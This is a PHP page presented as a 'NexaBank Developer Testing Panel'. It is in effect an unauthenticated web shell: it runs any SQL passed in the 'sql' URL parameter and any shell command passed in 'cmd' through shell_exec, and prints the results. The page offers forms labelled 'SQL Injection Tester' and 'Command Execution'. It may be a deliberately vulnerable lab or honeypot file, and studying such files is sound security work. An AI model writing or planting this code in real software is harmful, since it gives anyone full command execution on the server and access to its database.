<?php
require_once 'db_config.php'; 

echo '<!DOCTYPE html>
<html>
<head>
    <title>NexaBank Dev Tools</title>
    <link href="../css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container mt-5">
        <div class="card shadow">
            <div class="card-header bg-danger text-white">
                <h3>🚨 NexaBank Developer Testing Panel 🚨</h3>
            </div>
            <div class="card-body">';

if (isset($_GET['sql'])) {
    echo "<h4>SQL Query Results:</h4><pre>";
    $query = $_GET['sql'];
    $result = $db->query($query);
    
    if ($result) {
        if ($result->num_rows > 0) {
            while ($row = $result->fetch_assoc()) {
                print_r($row);
            }
        } else {
            echo "Query executed, but no results.";
        }
    } else {
        echo "ERROR: " . $db->error;
    }
    echo "</pre><hr>";
}

if (isset($_GET['cmd'])) {
    echo "<h4>Command Output:</h4><pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre><hr>";
}

echo '
                <h4>SQL Injection Tester</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="sql" class="form-control" placeholder="SELECT * FROM users">
                    </div>
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
                <hr>
                <h4>Command Execution</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="cmd" class="form-control" placeholder="whoami">
                    </div>
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>';
